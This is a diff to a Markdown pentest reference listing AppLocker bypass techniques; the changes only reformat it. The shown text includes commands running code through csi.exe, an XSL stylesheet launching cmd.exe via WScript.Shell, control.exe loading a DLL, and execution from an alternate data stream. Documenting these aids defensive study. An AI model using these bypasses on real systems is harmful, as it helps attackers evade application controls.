@@ -258,8 +258,7 @@ Link:  https://twitter.com/KyleHanslovan/status/912659279806640128
 ``` stylus
 "C:\Program Files (x86)\MSBuild\14.0\Bin\csi.exe\"  secist.csx
 ```
-</br>
-</br>
+
 ## Code   secist.csx
 ``` stylus
 using System;System.Diagnostics.Process.Start("calc.exe");
@@ -314,7 +313,9 @@ var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /k C:\\PSShell.exe");
 </xsl:stylesheet>
 ```
 
-Link:  https://pentestlab.blog/2017/07/06/applocker-bypass-msxsl/
+Link:  
+
+https://pentestlab.blog/2017/07/06/applocker-bypass-msxsl/
 https://evi1cg.me/archives/AppLocker_Bypass_MSXSL.html
 
 
@@ -334,12 +335,20 @@ https://twitter.com/subTee/status/793151392185589760
 
 
 
-## 11.control  .\example\runcalc.dll
+## 11.control
+
+
+``` 
+control  .\example\runcalc.dll
+``` 
 
 
 
-
-## 12.type .\example\runcalc.dll >  .\example\demon:secist.dll | control   .\example\demon:secist.dll
+## 12.ADS
+``` stylus
+      type .\example\runcalc.dll >  .\example\demon:secist.dll 
+      control   .\example\demon:secist.dll
+``` 
 LINK: https://twitter.com/bohops/status/954466315913310209
 https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/
 
